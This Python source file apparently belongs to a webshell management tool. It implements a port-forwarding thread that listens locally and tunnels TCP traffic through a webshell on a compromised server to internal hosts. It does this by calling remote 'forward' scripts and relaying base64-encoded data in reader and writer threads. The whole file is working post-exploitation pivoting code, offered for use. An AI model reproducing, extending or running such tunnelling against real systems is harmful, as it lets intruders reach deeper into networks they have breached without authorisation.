import threading
import json
import base64
import socket
import select
from api.exploit import WebshellExploit
from api import utils, logger


class Forward(threading.Thread):

    max_listen_count = 30

    def __init__(self, lhost: str, lport: int, rhost: str, rport: int, upload_buf_size: int, exploit: WebshellExploit):
        super().__init__()
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.rport = rport
        self.upload_buf_size = upload_buf_size
        self.exp = exploit

        self.connections = {}  # 存储已建立连接,如{'sessionid':socket}
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 监听套接字
        self.lock = threading.Lock()
        self._rule_name = f"{self.lhost}:{self.lport} => {self.rhost}:{self.rport}"
        self.name = self._rule_name

    def _writer(self, sessionid: str):
        socket = self.connections.get(sessionid)
        if socket is None:
            return
        readl = [socket, ]
        while sessionid in self.connections:
            rl, wl, el = select.select(readl, [], [], 180)
            if not rl:
                break
            writebuf = b''
            while True:
                tmp = None
                try:
                    tmp = socket.recv(1024)
                except BlockingIOError:
                    pass
                except OSError:
                    self._close(sessionid)
                    return
                if not tmp:
                    break
                writebuf += tmp
            while writebuf: # 限制每次上传的大小
                block = writebuf[:self.upload_buf_size] if self.upload_buf_size > 0 else writebuf
                writebuf = writebuf[self.upload_buf_size:] if self.upload_buf_size > 0 else False
                self.exp.evalfile('forward/writer',
                                  sessionid=sessionid, writebuf=block)
        self._close(sessionid)

    def _reader(self, sessionid: str):
        socket = self.connections.get(sessionid)
        if socket is None:
            return
        while sessionid in self.connections:
            self.exp.session.client.options.set_temp_option('timeout', 0)
            self.exp.session.client.options.set_temp_option('verbose', 1)
            ret = self.exp.evalfile('forward/reader', sessionid=sessionid)
            ret = ret.data
            if ret is None:
                break
            ret = json.loads(ret)
            if ret['code'] == 1:
                data = base64.b64decode(ret['msg'].encode())
                try:
                    socket.sendall(data)
                except OSError:
                    break
            elif ret['code'] == -1:
                break
        self._close(sessionid)

    def _close(self, sessionid: str):
        self.lock.acquire()
        if sessionid in self.connections:
            client = self.connections.pop(sessionid)
            if client:
                try:
                    client.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                client.close()
            self.exp.evalfile('forward/close', sessionid=sessionid)
            logger.warning('Connection is closed!')
        self.lock.release()

    def _forward(self, sessionid: str):
        '''执行前需要把webshell超时时间设置为无限
        '''
        self.exp.session.client.options.set_temp_option('timeout', 0)
        self.exp.session.client.options.set_temp_option('verbose', 1)
        ret = self.exp.evalfile(
            'forward/forward', rhost=self.rhost, rport=self.rport, sessionid=sessionid)
        ret = ret.data
        if ret is None:
            logger.warning(
                "Forward request has exit!If forwarding is still working, please ignore this warning.")
            return
        ret = json.loads(ret)
        if ret['code'] == -1:  # connect failed
            error = base64.b64decode(ret['msg'].encode()).decode(
                self.exp.session.client.options.encoding, 'ignore')
            logger.error(error)
        elif ret['code'] == 1:
            logger.info(
                f"Connection has closed successfully for id `{sessionid}`!", False)

        self._close(sessionid)

    def close(self):  # 关闭所有连接并退出线程
        ids = list(self.connections.keys())
        for i in ids:
            self._close(i)
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        self.sock.close()
        self.join(5)
        if self.is_alive():
            utils.kill_thread(self.ident)

    def run(self):
        try:
            self.sock.bind((self.lhost, self.lport))
            self.sock.listen(self.max_listen_count)
        except OSError as e:
            logger.error(e)
            return
        thread_list = []
        while True:
            try:
                sock, addr = self.sock.accept()
            except OSError:
                break
            logger.info(f"A connection created!From {addr}")

            sock.setblocking(False)
            sessionid = utils.randomstr(16)
            self.connections[sessionid] = sock

            forwardwork = threading.Thread(target=self._forward, args=(
                sessionid, ), name=f"{sessionid}-forward on rule `{self._rule_name}`")
            readerthread = threading.Thread(target=self._reader, args=(
                sessionid, ), name=f"{sessionid}-reader on rule `{self._rule_name}`")
            writerthread = threading.Thread(target=self._writer, args=(
                sessionid, ), name=f"{sessionid}-writer on rule `{self._rule_name}`")
            thread_list.append(forwardwork)
            thread_list.append(readerthread)
            thread_list.append(writerthread)

            forwardwork.setDaemon(True)
            readerthread.setDaemon(True)
            writerthread.setDaemon(True)
            forwardwork.start()
            utils.sleep(1)
            readerthread.start()
            writerthread.start()

        for t in thread_list:
            t.join()
